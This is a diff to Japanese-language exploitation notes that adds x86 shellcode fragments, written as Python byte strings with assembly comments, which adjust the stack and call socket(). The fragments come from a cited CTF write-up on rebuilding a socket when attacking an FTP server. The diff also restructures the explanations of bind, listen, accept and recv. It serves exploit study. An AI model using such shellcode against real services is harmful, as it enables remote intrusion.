@@ -2164,23 +2164,50 @@ FTPサーバーなどが対象の場合、攻撃者とソケットが作成さ�
 その場合は新たにソケットを`socket(),bind(),listen(),accept,recv()`の順に作成すれば解決する！   
 例）https://buffered.io/posts/idsecconf-2013-myftpd-challenge/   
 ```txt
+  block1 = ""
+  # Adjust the stack to prevent it from breaking things in our shellcode
+  block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C  
 # socket() socket新規作成する
            socket()を実行した段階ではソケットが作られただけであり、ポー ト番号などは未確定
            int socket(int domain, int type, int protocol); 
            
+  block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
+  block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
+  # set up the stack for the call to `socket`
+  block1 += "\xB0\x06"                           # MOV AL, 0x6
+  block1 += "\x50"                               # PUSH EAX
+  block1 += "\xB0\x01"                           # MOV AL, 0x1
+  block1 += "\x50"                               # PUSH EAX
+  block1 += "\x40"                               # INC EAX
+  block1 += "\x50"                               # PUSH EAX
+  # invoke the call to `socket`
+  block1 += "\xFF\xD3"                           # CALL EBX  socket(2,1,6)を実行！
+```
+![image](https://user-images.githubusercontent.com/56021519/90307721-f2da8000-df13-11ea-95d8-a5b2a5d08b84.png)
+![image](https://user-images.githubusercontent.com/56021519/90307767-73997c00-df14-11ea-96da-870c673f139e.png)
+```txt
 # bind()   socket登録
            生成したソケットにポート番号など割り当て
            int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-           
+
+```
+
+```txt
 # listen() ソケット接続準備
            通信接続を待つための準備作業
            int listen(int sockfd, int backlog);
-           
+      
+```
+
+```txt
 # accept() ソケット接続待機
            クライアント側からの通信接続を待つ。サーバ側プログラムが accept()を実行すると、
            クライアント側からの通信接続要求が来るまでプログラムが停止し、接続後にプログラムを再開
            int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-           
+      
+```
+
+```txt
 # recv()   データ受信
 　　　　　　ssize_t read(int fd, void *buf, size_t count);
 
